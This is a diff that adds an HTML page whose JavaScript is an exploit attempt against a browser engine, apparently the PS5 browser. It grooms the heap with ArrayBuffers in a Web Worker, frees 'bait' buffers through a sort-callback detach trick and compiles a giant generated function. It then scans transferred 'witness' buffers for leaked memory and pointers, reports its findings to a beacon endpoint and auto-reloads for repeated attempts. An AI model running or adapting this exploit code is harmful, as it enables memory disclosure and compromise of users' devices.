@@ -1,0 +1,222 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1187v6 In-Worker Bait-and-Switch</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
+#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
+#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
+#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
+#phase{font-size:16px;color:#00ffee}
+#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
+#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
+#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
+max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<div id="hud">
+  <h1>P1187v6 — IN-WORKER BAIT-AND-SWITCH</h1>
+  <div id="status">BOOTING...</div>
+  <div id="phase">phase: init</div>
+  <div id="counters">stage: ?</div>
+  <div id="finds">no findings yet</div>
+</div>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),S=document.getElementById('status'),
+PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
+var T0=Date.now();
+function setStatus(t){S.textContent=t;}
+function setPhase(t){PH.textContent='phase: '+t;}
+function setCounters(t){CT.textContent=t;}
+function addFind(t){var d=document.createElement('div');d.textContent=t;FD.textContent='';FD.appendChild(d);}
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function B(tag,data){try{var u='/beacon.php?tag=P1187-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+
+/* ═══════════════════════════════════════════════════════════════════════
+   P1187v6: ALL geometry INSIDE the sweep worker. The metadata buffer is
+   worker-allocated -> the sweep flows through the worker's region; main
+   thread witnesses can never be in the path (v1-v5 all missed). Fix:
+   - worker allocates witnesses -> postMessage-TRANSFERs them to main
+     (backing addresses unchanged - still in the worker's marge pages;
+     main polls them via DataView)
+   - worker allocates baits -> sort-detach frees each (P1061-verified
+     synchronous free on PS5)
+   - worker calls the fn -> buffer fills a worker hole -> sweep writes
+     through the witness backings -> MAIN POLLS AND HARVESTS
+   ═══════════════════════════════════════════════════════════════════════ */
+
+var attempt=0;
+try{attempt=parseInt(localStorage.getItem('p1187v6_att')||'0');}catch(e){}
+try{localStorage.setItem('p1187v6_att',''+(attempt+1));}catch(e){}
+B('BOOT','attempt='+attempt);
+
+if(attempt>=3){
+  setStatus('IDLE');
+  B('IDLE','3 attempts done');
+  try{localStorage.removeItem('p1187v6_att');}catch(e){}
+}else{
+
+var N_TARGET=38348816;
+var CHUNK=4000000;
+var CHUNKS=Math.floor(N_TARGET/CHUNK);
+var REM=N_TARGET-CHUNKS*CHUNK;
+var witnesses=[];
+var goSent=false,lastB=0,deepDone=false;
+
+function buildBlob(){
+  var t0=Date.now();
+  var parts=[];
+  parts.push('self.__v141fn=function(a){');
+  for(var c=0;c<CHUNKS;c++){
+    parts.push('a();'.repeat(CHUNK));
+    if(c%4===0)B('BLD','c='+c+'|ms='+(Date.now()-t0));
+  }
+  if(REM>0)parts.push('a();'.repeat(REM));
+  parts.push('};self.postMessage({t:"compiled"});');
+  var blob=new Blob(parts,{type:'application/javascript'});
+  parts=null;
+  B('BLOB','ms='+(Date.now()-t0));
+  return blob;
+}
+
+/* worker source: compile, then on 'go' do the in-worker geometry */
+var workerCode=function(src){
+  return 'importScripts('+JSON.stringify(src)+');'+
+  'self.onmessage=function(m){'+
+  ' if(m.data==="go"){'+
+  '  var SIZES=[100224,100352,100608,100864,101376,102400];'+
+  '  var wits=[];'+
+  '  for(var si=0;si<SIZES.length;si++)for(var j=0;j<25;j++)wits.push(new ArrayBuffer(SIZES[si]));'+
+  '  self.postMessage(wits,wits);'+
+  '  var baits=[];'+
+  '  for(var sj=0;sj<SIZES.length;sj++)for(var i=0;i<25;i++)baits.push(new ArrayBuffer(SIZES[sj]));'+
+  '  /* sort-detach free each bait (P1061 synchronous free) */'+
+  '  for(var b=0;b<baits.length;b++){'+
+  '   try{'+
+  '    var u8=new Uint8Array(baits[b]);'+
+  '    var d=false;'+
+  '    u8.sort(function(x,y){'+
+  '     if(!d){d=true;structuredClone(baits[b],{transfer:[baits[b]]});}'+
+  '     return 0;'+
+  '    });'+
+  '   }catch(e){}'+
+  '  }'+
+  '  baits=null;'+
+  '  try{self.__v141fn(function(){ });}catch(e){}'+
+  ' }'+
+  '};';
+};
+
+function deepScan(ab,i){
+  var dv=new DataView(ab);
+  var len=ab.byteLength;
+  var nzQ=0,firstNZ='';
+  for(var q=0;q+7<len;q+=8){
+    var lo=dv.getUint32(q,true),hi=dv.getUint32(q+4,true);
+    if(lo||hi){nzQ++;if(!firstNZ)firstNZ='q'+q+'='+hi.toString(16).padStart(8,'0')+lo.toString(16).padStart(8,'0');}
+  }
+  var sigs=[];
+  for(var p=0;p+28<len;p+=4){
+    if(dv.getUint32(p,true)===0xFFFFFFFF){
+      var cpLo=dv.getUint32(p+12,true),cpHi=dv.getUint32(p+16,true);
+      var idx=dv.getUint32(p+56,true);
+      sigs.push('p='+p+'|cp=0x'+cpHi.toString(16).padStart(8,'0')+cpLo.toString(16).padStart(8,'0')+'|idx='+idx);
+      if(sigs.length>=3)break;
+    }
+  }
+  B('FIND','i='+i+'|nz='+nzQ+'|first='+firstNZ+'|sigs='+sigs.join(';'));
+  addFind('WITNESS['+i+']: '+firstNZ+' | '+sigs.slice(0,2).join(' | '));
+  setStatus('*** HARVEST: '+firstNZ+' ***');
+  try{localStorage.setItem('p1187v6_find',JSON.stringify({i:i,first:firstNZ,sigs:sigs}));}catch(e){}
+  deepDone=true;
+}
+
+function poll(){
+  if(!goSent||deepDone)return;
+  for(var i=0;i<witnesses.length;i++){
+    var ab=witnesses[i];
+    if(!ab)continue;
+    var dv=new DataView(ab);
+    for(var q=0;q<128;q++){
+      var lo=dv.getUint32(q*8,true),hi=dv.getUint32(q*8+4,true);
+      if(lo||hi){deepScan(ab,i);return;}
+    }
+  }
+  if(Date.now()-lastB>700){
+    lastB=Date.now();
+    B('POLL','wits='+witnesses.length+'|clean');
+    setCounters('witnesses='+witnesses.length+'|clean so far');
+  }
+  setTimeout(poll,10);
+}
+
+function runSweep(blob){
+  var blobUrl=URL.createObjectURL(blob);
+  var wUrl=URL.createObjectURL(new Blob([workerCode(blobUrl)],{type:'application/javascript'}));
+  var worker=new Worker(wUrl);
+  worker.__compiled=false;
+  worker.onmessage=function(m){
+    if(m.data&&m.data.t==='compiled'){
+      worker.__compiled=true;
+      B('WORKER-COMPILED','ok');
+      setPhase('awaiting witnesses');
+      setTimeout(function(){
+        goSent=true;
+        B('GO','worker geometry + sweep');
+        setStatus('SWEEP RUNNING — polling transferred witnesses');
+        poll();
+        worker.postMessage('go');
+        setTimeout(function(){
+          B('SURVIVED','finds='+(deepDone?1:0));
+          B('DONE','survived');
+        },25000);
+      },300);
+    }else if(m.data&&m.data.t==='err'){B('WORKER-ERR',String(m.data.e).slice(0,60));}
+    else if(m.data&&typeof m.data.length==='number'&&(m.data.length===0||(m.data[0]&&typeof m.data[0].byteLength==='number'))){
+      /* transferred witness buffers (array) */
+      for(var w=0;w<m.data.length;w++){
+        if(m.data[w]&&m.data[w].byteLength>0)witnesses.push(m.data[w]);
+      }
+      B('WITS-RCVD','n='+witnesses.length);
+      setCounters('received '+witnesses.length+' transferred witnesses');
+    }
+  };
+  B('WORKER','created');
+}
+
+setPhase('building blob');
+var blob=buildBlob();
+runSweep(blob);
+
+setTimeout(function(){
+  if(!goSent){B('TIMEOUT','no go');B('DONE','timeout');}
+},90000);
+
+} /* attempts */
+
+/* auto-reload checker */
+(function(){
+  var cur='P1187-bait-switch-v6';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body></html>
